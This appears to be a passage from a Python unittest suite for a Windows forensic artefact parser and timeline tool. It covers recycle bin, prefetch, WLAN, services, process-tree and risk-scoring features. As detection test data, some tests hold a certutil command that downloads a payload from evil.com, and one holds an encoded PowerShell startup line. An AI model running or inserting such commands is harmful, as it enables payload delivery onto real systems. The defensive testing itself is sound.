        cats_sec = classify_event(4624, "Security", "Microsoft-Windows-Security-Auditing")
        self.assertIn("LOGON", cats_sec)
        self.assertIn("SECURITY", cats_sec)
        cats_tamp = classify_event(1102, "Security", "Microsoft-Windows-Security-Auditing")
        self.assertIn("TAMPERING", cats_tamp)

    def test_pipeline_has_26_parsers(self):
        from log_hunter.core.pipeline import PARSERS
        self.assertEqual(len(PARSERS), 26)
        self.assertNotIn("mountpoints2", PARSERS)
        self.assertIn("tasks", PARSERS)
        self.assertIn("network", PARSERS)
        self.assertIn("wlan", PARSERS)
        self.assertIn("recyclebin", PARSERS)

    def test_recyclebin_parse_v2(self):
        from log_hunter.parser.recyclebin import parse_dollar_i
        path = r"C:\Users\alice\Documents\report.docx"
        path_encoded = path.encode("utf-16-le")
        data = struct.pack("<Q", 2)  # version
        data += struct.pack("<Q", 102400)  # file_size
        data += struct.pack("<Q", 133500000000000000)  # deletion_time
        data += struct.pack("<I", len(path))  # path_len in chars
        data += path_encoded
        result = parse_dollar_i(data, "$I123456.docx")
        self.assertEqual(result["version"], 2)
        self.assertEqual(result["file_size"], 102400)
        self.assertEqual(result["original_path"], path)
        self.assertIn("2024", result["deletion_time"])

    def test_recyclebin_parse_v1(self):
        from log_hunter.parser.recyclebin import parse_dollar_i
        path = r"C:\temp\old.txt"
        path_encoded = path.encode("utf-16-le")
        data = struct.pack("<Q", 1)  # version
        data += struct.pack("<Q", 256)  # file_size
        data += struct.pack("<Q", 133500000000000000)  # deletion_time
        data += path_encoded + b"\0" * (520 - len(path_encoded))
        self.assertEqual(len(data), 544)
        result = parse_dollar_i(data, "$I000001.txt")
        self.assertEqual(result["version"], 1)
        self.assertEqual(result["original_path"], path)

    def test_recyclebin_parser_integration(self):
        from log_hunter.parser.recyclebin import RecycleBinParser
        path = r"C:\secret\passwords.xlsx"
        path_encoded = path.encode("utf-16-le")
        data = struct.pack("<Q", 2) + struct.pack("<Q", 50000)
        data += struct.pack("<Q", 133500000000000000) + struct.pack("<I", len(path))
        data += path_encoded
        with tempfile.TemporaryDirectory() as d:
            sid_dir = Path(d) / "S-1-5-21-123"
            sid_dir.mkdir()
            ifile = sid_dir / "$I123456.xlsx"
            ifile.write_bytes(data)
            parser = RecycleBinParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].sid, "S-1-5-21-123")
            self.assertIn("passwords.xlsx", events[0].path)

    def test_export_csv(self):
        from log_hunter.core.export import export_csv
        events = [
            ForensicEvent("evtx", "sec.evtx", "로그온 성공", "2024-01-01T00:00:00+00:00", sid="S-1-5-21-1"),
            ForensicEvent("prefetch", "CMD.EXE-1234.pf", "execution", None, details={"run_count": 5}),
        ]
        with tempfile.TemporaryDirectory() as d:
            out = Path(d) / "timeline.csv"
            count = export_csv(events, out)
            self.assertEqual(count, 2)
            import csv as _csv
            with out.open(encoding="utf-8-sig") as f:
                reader = list(_csv.DictReader(f))
            self.assertEqual(len(reader), 2)
            self.assertIn("details_json", reader[0])
            self.assertEqual(reader[0]["artifact"], "evtx")
            self.assertEqual(reader[0]["sid"], "S-1-5-21-1")
            parsed_details = json.loads(reader[1]["details_json"])
            self.assertEqual(parsed_details["run_count"], 5)

    def test_export_json(self):
        from log_hunter.core.export import export_json
        events = [
            ForensicEvent("mft", "mft_file", "file_record", "2024-06-15T12:00:00+00:00"),
        ]
        with tempfile.TemporaryDirectory() as d:
            out = Path(d) / "timeline.json"
            count = export_json(events, out)
            self.assertEqual(count, 1)
            data = json.loads(out.read_text(encoding="utf-8"))
            self.assertIsInstance(data, list)
            self.assertEqual(data[0]["artifact"], "mft")
            self.assertEqual(data[0]["action"], "file_record")

    def test_export_jsonl(self):
        from log_hunter.core.export import export_jsonl
        events = [
            ForensicEvent("bam", "bam_hive", "execution", "2024-03-01T08:00:00+00:00"),
            ForensicEvent("run", "run_hive", "autorun", details={"scope": "machine"}),
        ]
        with tempfile.TemporaryDirectory() as d:
            out = Path(d) / "timeline.jsonl"
            count = export_jsonl(events, out)
            self.assertEqual(count, 2)
            lines = out.read_text(encoding="utf-8").strip().split("\n")
            self.assertEqual(len(lines), 2)
            for line in lines:
                obj = json.loads(line)
                self.assertIn("artifact", obj)


    def test_bam_nt_to_dos_path(self):
        from log_hunter.parser.bam import _nt_to_dos_path
        self.assertEqual(_nt_to_dos_path(r"\Device\HarddiskVolume1\Windows\notepad.exe"), r"C:\Windows\notepad.exe")
        self.assertEqual(_nt_to_dos_path(r"\Device\HarddiskVolume2\app.exe"), r"D:\app.exe")
        self.assertEqual(_nt_to_dos_path(r"C:\plain\path.exe"), r"C:\plain\path.exe")
        custom = {1: "C:\\", 3: "E:\\"}
        self.assertEqual(_nt_to_dos_path(r"\Device\HarddiskVolume3\tool.exe", custom), r"E:\tool.exe")

    def test_bam_load_profile_list(self):
        from log_hunter.parser.bam import load_profile_list
        result = load_profile_list(__file__)
        self.assertEqual(result, {})

    def test_bam_profiles_kwarg_accepted(self):
        from log_hunter.parser.bam import BAMParser
        import inspect
        sig = inspect.signature(BAMParser.parse)
        self.assertIn("profiles", sig.parameters)



    def test_compute_stats_basic(self):
        from log_hunter.core.stats import compute_stats
        events = [
            ForensicEvent("evtx", "sec.evtx", "logon_ok", "2024-01-15T10:00:00+00:00", sid="S-1-5-21-1"),
            ForensicEvent("evtx", "sec.evtx", "logon_fail", "2024-01-15T14:30:00+00:00", sid="S-1-5-21-2"),
            ForensicEvent("prefetch", "CMD.EXE.pf", "execution", "2024-01-15T10:05:00+00:00"),
            ForensicEvent("tasks", "task.xml", "suspicious_task", "2024-01-16T02:00:00+00:00",
                          details={"risk_level": "high", "suspicion_flags": ["hidden_task"]}),
        ]
        stats = compute_stats(events)
        self.assertEqual(stats["total_events"], 4)
        self.assertEqual(stats["by_artifact"]["evtx"], 2)
        self.assertEqual(stats["unique_sources"], 3)
        self.assertEqual(stats["risk_summary"]["high"], 1)
        self.assertIn("2024-01-15", stats["time_range"]["earliest"])

    def test_detect_anomalies_burst(self):
        from log_hunter.core.stats import detect_anomalies
        base = "2024-06-01T12:00:"
        events = [
            ForensicEvent("evtx", "s.evtx", "evt", f"{base}{i % 60:02d}+00:00")
            for i in range(60)
        ]
        anomalies = detect_anomalies(events)
        burst = [a for a in anomalies if a["type"] == "burst"]
        self.assertTrue(len(burst) > 0, "burst anomaly expected")

    def test_hourly_distribution(self):
        from log_hunter.core.stats import compute_stats
        events = [
            ForensicEvent("evtx", "s.evtx", "a", "2024-01-01T03:00:00+00:00"),
            ForensicEvent("evtx", "s.evtx", "b", "2024-01-01T03:30:00+00:00"),
            ForensicEvent("evtx", "s.evtx", "c", "2024-01-01T15:00:00+00:00"),
        ]
        stats = compute_stats(events)
        self.assertEqual(stats["hourly_distribution"][3], 2)
        self.assertEqual(stats["hourly_distribution"][15], 1)

    def test_format_stats_text(self):
        from log_hunter.core.stats import compute_stats, format_stats_text
        events = [ForensicEvent("evtx", "s.evtx", "test", "2024-01-01T10:00:00+00:00")]
        stats = compute_stats(events)
        text = format_stats_text(stats)
        self.assertIn("1", text)
        self.assertIn("evtx", text)

    def test_auto_detect_evtx(self):
        self.assertEqual(detect_artifact("C:\\Logs\\Security.evtx"), "evtx")
        self.assertEqual(detect_artifact("C:\\Logs\\app.pf"), "prefetch")
        self.assertEqual(detect_artifact("C:\\$MFT"), "mft")
        self.assertEqual(detect_artifact("C:\\Amcache.hve"), "amcache")
        self.assertEqual(detect_artifact("C:\\test.lnk"), "lnk")

    def test_auto_detect_registry(self):
        self.assertEqual(detect_artifact("C:\\config\\NTUSER.DAT"), "userassist")
        self.assertEqual(detect_artifact("C:\\config\\SYSTEM"), "bam")
        self.assertEqual(detect_artifact("C:\\config\\SOFTWARE"), "network")

    def test_auto_detect_psreadline(self):
        self.assertEqual(detect_artifact("C:\\Users\\testuser\\ConsoleHost_history.txt"), "psreadline")

    def test_auto_detect_unknown(self):
        self.assertIsNone(detect_artifact("C:\\random\\file.xyz"))

    def test_auto_detect_directory(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "test.evtx").write_bytes(b"")
            (Path(d) / "app.pf").write_bytes(b"")
            (Path(d) / "random.txt").write_text("hello")
            results = detect_artifacts_in_directory(d)
            types = {art for art, _ in results}
            self.assertIn("evtx", types)
            self.assertIn("prefetch", types)
            self.assertNotIn("txt", types)

    def test_sid_resolver_no_hive(self):
        result = resolve_sids("C:\\nonexistent\\SOFTWARE")
        self.assertEqual(result, {})

    def test_prefetch_volume_parsing(self):
        data = bytearray(4096)
        struct.pack_into("<I", data, 0, 23)
        data[4:8] = b"SCCA"
        exe = "TEST.EXE".encode("utf-16-le")
        data[16:16+len(exe)] = exe
        struct.pack_into("<I", data, 76, 0xDEADBEEF)
        struct.pack_into("<Q", data, 128, 132000000000000000)
        struct.pack_into("<I", data, 152, 1)
        struct.pack_into("<II", data, 100, 800, 0)
        struct.pack_into("<I", data, 108, 600)
        struct.pack_into("<I", data, 112, 1)
        vol_path = "\\DEVICE\\HARDDISK0".encode("utf-16-le")
        struct.pack_into("<I", data, 600, 104)
        struct.pack_into("<I", data, 604, len("\\DEVICE\\HARDDISK0"))
        struct.pack_into("<Q", data, 608, 132000000000000000)
        struct.pack_into("<I", data, 616, 0x12345678)
        data[704:704+len(vol_path)] = vol_path
        with tempfile.NamedTemporaryFile(suffix=".pf", delete=False) as f:
            f.write(data)
            f.flush()
            parser = PrefetchParser()
            events = list(parser.parse(f.name))
            self.assertTrue(len(events) >= 1)
            self.assertEqual(events[0].details.get("version"), 23)
            vols = events[0].details.get("volumes")
            if vols:
                self.assertEqual(vols[0]["serial"], "12345678")

    def test_prefetch_filename_hash_match(self):
        data = bytearray(4096)
        struct.pack_into("<I", data, 0, 23)
        data[4:8] = b"SCCA"
        exe = "TEST.EXE".encode("utf-16-le")
        data[16:16+len(exe)] = exe
        struct.pack_into("<I", data, 76, 0xAABBCCDD)
        struct.pack_into("<Q", data, 128, 132000000000000000)
        struct.pack_into("<I", data, 152, 1)
        struct.pack_into("<II", data, 100, 800, 0)
        struct.pack_into("<I", data, 108, 0)
        struct.pack_into("<I", data, 112, 0)
        with tempfile.TemporaryDirectory() as d:
            pf_path = Path(d) / "TEST.EXE-AABBCCDD.pf"
            pf_path.write_bytes(data)
            parser = PrefetchParser()
            events = list(parser.parse(pf_path))
            self.assertTrue(len(events) >= 1)
            self.assertTrue(events[0].details.get("filename_hash_match"))


class TestWLANParser(unittest.TestCase):
    def test_wlan_parser_basic(self):
        from log_hunter.parser.wlan import parse_wlan_xml, WLANParser
        xml = '''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>TestNetwork</name>
  <SSIDConfig><SSID><hex>546573744E6574776F726B</hex><name>TestNetwork</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>auto</connectionMode>
  <MSM><security><authEncryption>
    <authentication>WPA2PSK</authentication>
    <encryption>AES</encryption>
  </authEncryption></security></MSM>
</WLANProfile>'''
        parsed = parse_wlan_xml(xml)
        self.assertIsNotNone(parsed)
        self.assertEqual(parsed["profile_name"], "TestNetwork")
        self.assertEqual(parsed["ssid_hex"], "546573744E6574776F726B")
        self.assertEqual(parsed["connection_type"], "ESS")
        self.assertEqual(parsed["authentication"], "WPA2PSK")
        self.assertEqual(parsed["encryption"], "AES")
        self.assertFalse(parsed["cleartext_password_found"])

    def test_wlan_parser_cleartext_password(self):
        from log_hunter.parser.wlan import parse_wlan_xml
        xml = '''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>InsecureWifi</name>
  <SSIDConfig><SSID><name>InsecureWifi</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <MSM><security>
    <authEncryption><authentication>open</authentication><encryption>none</encryption></authEncryption>
    <sharedKey><protected>false</protected><keyMaterial>plaintext_password_here</keyMaterial></sharedKey>
  </security></MSM>
</WLANProfile>'''
        parsed = parse_wlan_xml(xml)
        self.assertIsNotNone(parsed)
        self.assertTrue(parsed["cleartext_password_found"])
        self.assertEqual(parsed["connection_mode"], "manual")

    def test_wlan_parser_directory(self):
        from log_hunter.parser.wlan import WLANParser
        xml = b'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>CorpNet</name>
  <SSIDConfig><SSID><name>CorpNet</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>auto</connectionMode>
  <MSM><security><authEncryption>
    <authentication>WPA3SAE</authentication><encryption>AES</encryption>
  </authEncryption></security></MSM>
</WLANProfile>'''
        with tempfile.TemporaryDirectory() as d:
            guid_dir = Path(d) / "{12345678-ABCD-EF01-2345-6789ABCDEF01}"
            guid_dir.mkdir()
            (guid_dir / "profile.xml").write_bytes(xml)
            parser = WLANParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].details["authentication"], "WPA3SAE")
            self.assertEqual(events[0].details["interface_guid"], "{12345678-ABCD-EF01-2345-6789ABCDEF01}")


class TestDeletionCorrelation(unittest.TestCase):
    def test_correlation_deletion(self):
        events = [
            ForensicEvent(timestamp="2024-03-15T10:00:00", artifact="recyclebin",
                          action="deleted", path="C:\\Users\\testuser\\Documents\\secret.docx",
                          sid="S-1-5-21-123", source="$I_test"),
            ForensicEvent(timestamp="2024-03-15T09:30:00", artifact="prefetch",
                          action="executed", process="C:\\Program Files\\Office\\WINWORD.EXE",
                          path="C:\\Users\\testuser\\Documents\\secret.docx", sid="S-1-5-21-123", source="test.pf"),
            ForensicEvent(timestamp="2024-03-14T08:00:00", artifact="mft",
                          action="created", path="C:\\Users\\testuser\\Documents\\secret.docx",
                          sid="S-1-5-21-123", source="$MFT"),
            ForensicEvent(timestamp="2024-01-01T00:00:00", artifact="bam",
                          action="executed", path="C:\\Windows\\notepad.exe",
                          sid="S-1-5-21-999", source="SYSTEM"),
        ]
        relations = correlate(events)
        deletion_rels = [r for r in relations if r["type"] == "deletion_correlation"]
        self.assertTrue(len(deletion_rels) >= 2)
        for r in deletion_rels:
            self.assertEqual(r["basis"], "same_file")
            self.assertEqual(r["confidence"], "filename_match")
            self.assertEqual(r["left"], 0)
        right_indices = {r["right"] for r in deletion_rels}
        self.assertIn(1, right_indices)
        self.assertIn(2, right_indices)
        self.assertNotIn(3, right_indices)
        temporal_rels = [r for r in deletion_rels if r.get("temporal_proximity")]
        self.assertTrue(len(temporal_rels) >= 1)

    def test_correlation_deletion_sid_conflict(self):
        events = [
            ForensicEvent(timestamp="2024-03-15T10:00:00", artifact="recyclebin",
                          action="deleted", path="C:\\temp\\file.txt", sid="S-1-5-21-AAA", source="$I_test"),
            ForensicEvent(timestamp="2024-03-15T09:00:00", artifact="bam",
                          action="executed", path="C:\\temp\\file.txt", sid="S-1-5-21-BBB", source="SYSTEM"),
        ]
        relations = correlate(events)
        deletion_rels = [r for r in relations if r["type"] == "deletion_correlation"]
        self.assertEqual(len(deletion_rels), 0)

    def test_deletion_in_summary(self):
        events = [
            ForensicEvent(timestamp="2024-03-15T10:00:00", artifact="recyclebin",
                          action="deleted", path="C:\\temp\\report.pdf", source="$I_test"),
            ForensicEvent(timestamp="2024-03-15T09:00:00", artifact="prefetch",
                          action="executed", path="C:\\temp\\report.pdf", source="test.pf"),
        ]
        relations = correlate(events)
        summary = summarize_correlations(relations, events)
        self.assertGreater(summary["deletion_matches"], 0)


class TestBAMPipelineProfile(unittest.TestCase):
    def test_bam_pipeline_profile_integration(self):
        from log_hunter.parser.bam import BAMParser
        import inspect
        sig = inspect.signature(BAMParser.parse)
        self.assertIn("profiles", sig.parameters)
        from log_hunter.core.pipeline import AnalysisResult
        r = AnalysisResult()
        self.assertIsInstance(r.profiles, dict)


class TestFindDuplicates(unittest.TestCase):
    def test_find_duplicates(self):
        from log_hunter.core.stats import find_duplicates
        events = [
            ForensicEvent("evtx", "Security.evtx", "logon",
                          timestamp="2024-03-15T10:00:00", path="C:\\Windows\\System32\\svchost.exe"),
            ForensicEvent("evtx", "Security.evtx", "logon",
                          timestamp="2024-03-15T10:00:00", path="C:\\Windows\\System32\\svchost.exe"),
            ForensicEvent("evtx", "Security.evtx", "logoff",
                          timestamp="2024-03-15T10:00:00", path="C:\\Windows\\System32\\svchost.exe"),
            ForensicEvent("prefetch", "test.pf", "executed",
                          timestamp="2024-03-15T11:00:00", path="C:\\app.exe"),
        ]
        dupes = find_duplicates(events)
        self.assertEqual(len(dupes), 1)
        self.assertEqual(dupes[0], (0, 1, "exact_duplicate"))

    def test_find_duplicates_no_dupes(self):
        from log_hunter.core.stats import find_duplicates
        events = [
            ForensicEvent("evtx", "a.evtx", "logon", timestamp="2024-03-15T10:00:00", path="C:\\a.exe"),
            ForensicEvent("evtx", "b.evtx", "logon", timestamp="2024-03-15T11:00:00", path="C:\\a.exe"),
        ]
        dupes = find_duplicates(events)
        self.assertEqual(len(dupes), 0)


class TestBodyfileExport(unittest.TestCase):
    def test_export_bodyfile(self):
        from log_hunter.core.export import export_bodyfile
        events = [
            ForensicEvent("prefetch", "test.pf", "executed",
                          timestamp="2024-06-15T14:30:00",
                          time_field="modified",
                          path="C:\\Windows\\notepad.exe",
                          sid="S-1-5-21-123"),
            ForensicEvent("mft", "$MFT", "created",
                          timestamp="2024-06-15T10:00:00",
                          time_field="created",
                          path="C:\\Users\\testuser\\doc.txt"),
            ForensicEvent("evtx", "Security.evtx", "logon",
                          timestamp=None,
                          path="C:\\Windows\\System32"),
        ]
        with tempfile.NamedTemporaryFile(suffix=".bodyfile", delete=False, mode="w") as f:
            path = f.name
        try:
            count = export_bodyfile(events, path)
            self.assertEqual(count, 2)
            lines = Path(path).read_text(encoding="utf-8").strip().split("\n")
            self.assertEqual(len(lines), 2)
            fields = lines[0].split("|")
            self.assertEqual(len(fields), 11)
            self.assertEqual(fields[0], "0")
            self.assertIn("prefetch:executed", fields[1])
            self.assertIn("notepad.exe", fields[1])
            self.assertEqual(fields[4], "S-1-5-21-123")
            self.assertEqual(fields[7], "0")
            self.assertNotEqual(fields[8], "0")
            self.assertEqual(fields[9], "0")
            self.assertEqual(fields[10], "0")
            fields2 = lines[1].split("|")
            self.assertNotEqual(fields2[10], "0")
            self.assertEqual(fields2[7], "0")
        finally:
            Path(path).unlink(missing_ok=True)


class TestStartupParser(unittest.TestCase):
    def test_startup_parser_basic(self):
        with tempfile.TemporaryDirectory() as d:
            bat = Path(d) / "test.bat"
            bat.write_text("echo hello\n", encoding="utf-8")
            parser = StartupParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].artifact, "startup")
            self.assertEqual(events[0].action, "startup_entry")
            self.assertEqual(events[0].details["extension"], ".bat")
            self.assertIsNone(events[0].timestamp)

    def test_startup_parser_suspicious(self):
        with tempfile.TemporaryDirectory() as d:
            bat = Path(d) / "evil.bat"
            bat.write_bytes(b"powershell -encodedcommand JABP=\r\n")
            parser = StartupParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].action, "suspicious_startup")
            self.assertEqual(events[0].status, "warning")
            self.assertEqual(events[0].details["risk_level"], "high")
            self.assertTrue(len(events[0].details["indicators"]) >= 1)

    def test_startup_parser_ignores_non_executable(self):
        with tempfile.TemporaryDirectory() as d:
            txt = Path(d) / "readme.txt"
            txt.write_text("just a text file", encoding="utf-8")
            parser = StartupParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 0)


class TestProcessTree(unittest.TestCase):
    def test_process_tree_basic(self):
        from log_hunter.core.process_tree import build_process_tree, format_process_tree
        events = [
            ForensicEvent("evtx", "sysmon.evtx", "프로세스 생성",
                          timestamp="2024-06-01T10:00:00", details={
                              "event_id": 1,
                              "event_data": {"ProcessId": "1000", "ParentProcessId": "500",
                                             "Image": "C:\\Windows\\explorer.exe",
                                             "CommandLine": "explorer.exe",
                                             "User": "DESKTOP\\Admin",
                                             "ParentImage": "C:\\Windows\\winlogon.exe"}}),
            ForensicEvent("evtx", "sysmon.evtx", "프로세스 생성",
                          timestamp="2024-06-01T10:01:00", details={
                              "event_id": 1,
                              "event_data": {"ProcessId": "2000", "ParentProcessId": "1000",
                                             "Image": "C:\\Windows\\System32\\cmd.exe",
                                             "CommandLine": "cmd.exe /c whoami",
                                             "User": "DESKTOP\\Admin",
                                             "ParentImage": "C:\\Windows\\explorer.exe"}}),
            ForensicEvent("evtx", "sysmon.evtx", "프로세스 생성",
                          timestamp="2024-06-01T10:01:05", details={
                              "event_id": 1,
                              "event_data": {"ProcessId": "3000", "ParentProcessId": "2000",
                                             "Image": "C:\\Windows\\System32\\whoami.exe",
                                             "CommandLine": "whoami",
                                             "User": "DESKTOP\\Admin",
                                             "ParentImage": "C:\\Windows\\System32\\cmd.exe"}}),
        ]
        roots = build_process_tree(events)
        self.assertEqual(len(roots), 1)
        self.assertEqual(roots[0].pid, 1000)
        self.assertEqual(len(roots[0].children), 1)
        self.assertEqual(roots[0].children[0].pid, 2000)
        self.assertEqual(roots[0].children[0].children[0].pid, 3000)
        text = format_process_tree(roots)
        self.assertIn("PID:1000", text)
        self.assertIn("PID:2000", text)
        self.assertIn("PID:3000", text)

    def test_process_tree_suspicious(self):
        from log_hunter.core.process_tree import build_process_tree, detect_suspicious_trees
        events = []
        for i in range(7):
            pid = 100 + i
            ppid = 100 + i - 1 if i > 0 else 1
            events.append(ForensicEvent("evtx", "sysmon.evtx", "프로세스 생성",
                          timestamp=f"2024-06-01T10:00:{i:02d}", details={
                              "event_id": 1,
                              "event_data": {"ProcessId": str(pid), "ParentProcessId": str(ppid),
                                             "Image": f"C:\\temp\\stage{i}.exe",
                                             "CommandLine": f"stage{i}.exe",
                                             "User": "DESKTOP\\User",
                                             "ParentImage": f"C:\\temp\\stage{i-1}.exe" if i > 0 else "unknown.exe"}}))
        events.append(ForensicEvent("evtx", "sysmon.evtx", "프로세스 생성",
                      timestamp="2024-06-01T10:01:00", details={
                          "event_id": 1,
                          "event_data": {"ProcessId": "9999", "ParentProcessId": "106",
                                         "Image": "C:\\Windows\\System32\\certutil.exe",
                                         "CommandLine": "certutil -urlcache -split -f http://evil.com/payload",
                                         "User": "DESKTOP\\User",
                                         "ParentImage": "C:\\temp\\stage6.exe"}}))
        roots = build_process_tree(events)
        findings = detect_suspicious_trees(roots)
        types = [f["type"] for f in findings]
        self.assertIn("deep_nesting", types)
        self.assertIn("temp_execution", types)
        self.assertIn("lolbin_unusual_parent", types)
        lolbin = [f for f in findings if f["type"] == "lolbin_unusual_parent"]
        self.assertTrue(any("certutil" in f["description"] for f in lolbin))


class TestSecurityDetailExtraction(unittest.TestCase):
    def test_security_detail_extraction_logon(self):
        data = {
            "LogonType": "10",
            "TargetUserName": "administrator",
            "TargetDomainName": "CORP",
            "IpAddress": "192.0.2.100",
            "IpPort": "49152",
            "WorkstationName": "ATTACKER-PC",
            "AuthenticationPackageName": "NTLM",
        }
        result = extract_security_details(4624, data)
        self.assertEqual(result["LogonType"], "10")
        self.assertEqual(result["TargetUserName"], "administrator")
        self.assertEqual(result["IpAddress"], "192.0.2.100")
        self.assertEqual(len(result), 7)
        partial = {"LogonType": "3", "TargetUserName": "svc_account"}
        result2 = extract_security_details(4624, partial)
        self.assertEqual(len(result2), 2)
        self.assertNotIn("IpAddress", result2)
        self.assertEqual(result2["LogonType"], "3")
        self.assertEqual(extract_security_details(4624, {}), {})
        self.assertEqual(extract_security_details(9999, data), {})

    def test_security_detail_extraction_process(self):
        data = {
            "NewProcessName": r"C:\Windows\System32\cmd.exe",
            "ParentProcessName": r"C:\Windows\explorer.exe",
            "CommandLine": "cmd.exe /c whoami",
            "TokenElevationType": "%%1936",
        }
        result = extract_security_details(4688, data)
        self.assertEqual(result["NewProcessName"], r"C:\Windows\System32\cmd.exe")
        self.assertEqual(result["CommandLine"], "cmd.exe /c whoami")
        self.assertEqual(len(result), 4)
        partial = {"NewProcessName": r"C:\tool.exe", "CommandLine": "tool.exe --help"}
        result2 = extract_security_details(4688, partial)
        self.assertEqual(len(result2), 2)
        self.assertNotIn("ParentProcessName", result2)


class TestEnrichment(unittest.TestCase):
    def test_enrichment_activity_classification(self):
        from log_hunter.core.enrichment import enrich_events
        events = [
            ForensicEvent("userassist", "src", "run", timestamp="2024-01-01T10:00:00+00:00"),
            ForensicEvent("prefetch", "src", "trace", timestamp="2024-01-01T10:01:00+00:00"),
            ForensicEvent("evtx", "src", "logon", timestamp="2024-01-01T10:02:00+00:00"),
            ForensicEvent("mft", "src", "created", timestamp="2024-01-01T10:03:00+00:00"),
            ForensicEvent("usb", "src", "connected", timestamp="2024-01-01T10:04:00+00:00"),
            ForensicEvent("run", "src", "autorun", timestamp="2024-01-01T10:05:00+00:00"),
        ]
        enriched = enrich_events(events)
        self.assertEqual(enriched[0].details["activity_class"], "user_activity")
        self.assertEqual(enriched[1].details["activity_class"], "execution")
        self.assertEqual(enriched[2].details["activity_class"], "security")
        self.assertEqual(enriched[3].details["activity_class"], "file_operation")
        self.assertEqual(enriched[4].details["activity_class"], "storage")
        self.assertEqual(enriched[5].details["activity_class"], "system_config")

    def test_enrichment_session_grouping(self):
        from log_hunter.core.enrichment import enrich_events
        events = [
            ForensicEvent("evtx", "a", "login", timestamp="2024-01-01T10:00:00+00:00", sid="S-1-5-21-100"),
            ForensicEvent("evtx", "b", "action", timestamp="2024-01-01T10:10:00+00:00", sid="S-1-5-21-100"),
            ForensicEvent("evtx", "c", "action", timestamp="2024-01-01T12:00:00+00:00", sid="S-1-5-21-100"),
            ForensicEvent("evtx", "d", "action", timestamp="2024-01-01T10:05:00+00:00", sid="S-1-5-21-200"),
        ]
        enriched = enrich_events(events)
        self.assertEqual(enriched[0].details["session_id"], enriched[1].details["session_id"])
        self.assertNotEqual(enriched[1].details["session_id"], enriched[2].details["session_id"])
        self.assertNotEqual(enriched[0].details["session_id"], enriched[3].details["session_id"])

    def test_enrichment_risk_scoring(self):
        from log_hunter.core.enrichment import enrich_events
        events = [
            ForensicEvent("evtx", "a", "logon", timestamp="2024-01-01T03:00:00+00:00"),
            ForensicEvent("evtx", "b", "logon", timestamp="2024-01-01T10:00:00+00:00"),
            ForensicEvent("wlan", "c", "cleartext_password_detected", timestamp="2024-01-01T10:00:00+00:00"),
            ForensicEvent("psreadline", "d", "certutil -urlcache -split -f http://evil.com",
                          timestamp="2024-01-01T10:00:00+00:00"),
            ForensicEvent("evtx", "e", "logon", timestamp="2024-01-01T10:00:00+00:00", status="partial"),
        ]
        enriched = enrich_events(events)
        self.assertEqual(enriched[0].details["risk_score"], 0)
        self.assertEqual(enriched[1].details["risk_score"], 0)
        self.assertGreaterEqual(enriched[2].details["risk_score"], 50)
        self.assertGreaterEqual(enriched[3].details["risk_score"], 30)
        self.assertGreaterEqual(enriched[4].details["risk_score"], 10)

    def test_session_summary(self):
        from log_hunter.core.enrichment import enrich_events, summarize_sessions
        events = [
            ForensicEvent("evtx", "a", "login", timestamp="2024-01-01T10:00:00+00:00", sid="S-1-5-21-100"),
            ForensicEvent("prefetch", "b", "trace", timestamp="2024-01-01T10:15:00+00:00", sid="S-1-5-21-100"),
            ForensicEvent("evtx", "c", "action", timestamp="2024-01-01T14:00:00+00:00", sid="S-1-5-21-100"),
        ]
        enriched = enrich_events(events)
        summaries = summarize_sessions(enriched)
        self.assertTrue(len(summaries) >= 2)
        session_2 = next(s for s in summaries if s["event_count"] == 2)
        self.assertEqual(session_2["duration_seconds"], 900.0)
        self.assertEqual(session_2["primary_sid"], "S-1-5-21-100")
        self.assertIn("evtx", session_2["unique_artifacts"])
        self.assertIn("prefetch", session_2["unique_artifacts"])
        self.assertIsNotNone(session_2["start_time"])
        self.assertIsNotNone(session_2["end_time"])


class TestServicesParser(unittest.TestCase):
    def test_services_suspicious_check(self):
        from log_hunter.parser.services import _check_service_suspicious
        indicators = _check_service_suspicious("C:\\Users\\Public\\malware.exe", "x", 2)
        self.assertTrue(len(indicators) >= 2)
        self.assertTrue(any("suspicious_path" in i for i in indicators))
        self.assertIn("single_char_display_name", indicators)

    def test_services_clean_check(self):
        from log_hunter.parser.services import _check_service_suspicious
        indicators = _check_service_suspicious("C:\\Windows\\System32\\svchost.exe", "Windows Update", 2)
        self.assertEqual(len(indicators), 0)

    def test_services_auto_start_outside_system(self):
        from log_hunter.parser.services import _check_service_suspicious
        indicators = _check_service_suspicious("D:\\tools\\agent.exe", "Agent", 2)
        self.assertIn("auto_start_outside_system_dirs", indicators)

    def test_services_parser_import(self):
        from log_hunter.parser.services import ServicesParser
        parser = ServicesParser()
        self.assertEqual(parser.artifact, "services")


if __name__ == "__main__":
    unittest.main()
